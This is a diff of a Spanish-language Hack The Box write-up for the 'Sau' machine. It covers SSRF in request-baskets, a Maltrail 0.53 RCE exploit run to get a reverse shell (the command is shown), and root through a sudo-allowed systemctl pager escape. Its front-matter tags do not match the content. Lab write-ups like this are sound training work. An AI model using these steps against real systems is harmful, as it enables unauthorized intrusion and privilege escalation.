@@ -1,4 +1,24 @@
-
+---
+layout: single
+title: Sau - Hack The Box
+excerpt: "."
+date: 2023-10-28
+classes: wide
+header:
+  teaser: /assets/images/htb-writeup-sau/sau_logo.png
+  teaser_home_page: true
+  icon: /assets/images/hackthebox.webp
+categories:
+  - hackthebox
+  - infosec
+tags:  
+  - rsync
+  - encfs
+  - squid
+  - xpath
+  - CVE-2020-11108
+  - command injection
+---
 
 
 # PortScan
@@ -24,19 +44,19 @@ PORT      STATE    SERVICE REASON
 
 # Sitio Web
 
-![[Pasted image 20231028164933.png]]
+![](/assets/images/htb-writeup-sau/Pasted image 20231028164933.png)
 
 
 Sí indagamos un poco en busca de vulnerabilidades, encontraremos qué esta versión de "**request-baskets**" es vulnerable a un (**CSRF**), [(CVE-2023–27163)](https://medium.com/@li_allouche/request-baskets-1-2-1-server-side-request-forgery-cve-2023-27163-2bab94f201f7), de manera qué podríamos aprovecharnos de esta vulnerabilidad para descubrir qué hay en el ":80" qué nos apareció como "filtered"
 
 
-![[Pasted image 20231028165410.png]]
+![](/assets/images/htb-writeup-sau/Pasted image 20231028165410.png)
 
 
 Debemos tener todas las check's seleccionados, y en la URL indicar el localhost y que apunte al **:80**, esto para qué la misma máquina host apunte a su puerto & pueda visualizar que servicio corre en este puerto, probablemente un HTTP, ya qué exteriormente a lo mejor por reglas de "firewall" no podamos visualizar.
 
 
-![[Pasted image 20231028165642.png]]
+![](/assets/images/htb-writeup-sau/Pasted image 20231028165642.png)
 
 
 Podemos ver que en el **":80"** está corriendo un **Mailtrail** con versión **0.53**, sí indagamos en busca de vulnerabilidades para este este aplicativo encontraremos qué podemos llevar a cabo un **RCE**, como sé explica en [éste artículo](https://securitylit.medium.com/exploiting-maltrail-v0-53-unauthenticated-remote-code-execution-rce-66d0666c18c5), y sí indagamos más encontraremos exploit para aprovecharnos de esta vulnerabilidad para otorgarnos una Reverse Shell, un script montado en python, a continuación se dejará el script utilizado.
@@ -85,7 +105,7 @@ python3 exploit.py 10.10.14.116 443 http://10.10.11.224:55555/733up1m
 Esto puede llevar un poco de tiempo, pero al cabo de un rato nos otorgará una reverse shell.
 
 
-![[Pasted image 20231028170555.png]]
+![](/assets/images/htb-writeup-sau/Pasted image 20231028170555.png)
 
 
 # Escalada de Privilegios
@@ -96,7 +116,7 @@ sudo -l
 ```
 
 
-![[Pasted image 20231028170807.png]]
+![](/assets/images/htb-writeup-sau/Pasted image 20231028170807.png)
 
 Veremos qué podemos ejecutar el binario **"systemctl status trail.service"** como todos los usuarios y sin proporcionar contraseñas, por ende podemos aprovecharnos de esto para ejecutar con sudo este binario & como está configurado no nos pedirá la credenciales del usuario actual, por lo qué tan sólo debemos poner el "sudo" delante del binario, es decir esto:
 
@@ -106,10 +126,10 @@ sudo systemctl status trail.service
 
 Nos abrirá el binario como **Root**, y para aprovecharnos de esto debemos hacer como cuando usamos **vim** que nos abrimos el apartado para guardar, quitar, etcera, es decir "q" o "w", pero en vez de esto llamaremos una **tty**, ya sea una bash, sh o cualquiera otra, pero para esto debemos poner un signo de admiración hacia abajo y luego llamar la consola, como veremos a contiuación
 
-![[Pasted image 20231028171134.png]]
+![](/assets/images/htb-writeup-sau/Pasted image 20231028171134.png)
 
 
 Posterior a ello obtendremos la tty indicada pero como Root.
 
 
-![[Pasted image 20231028171815.png]]
+![](/assets/images/htb-writeup-sau/Pasted image 20231028171815.png)
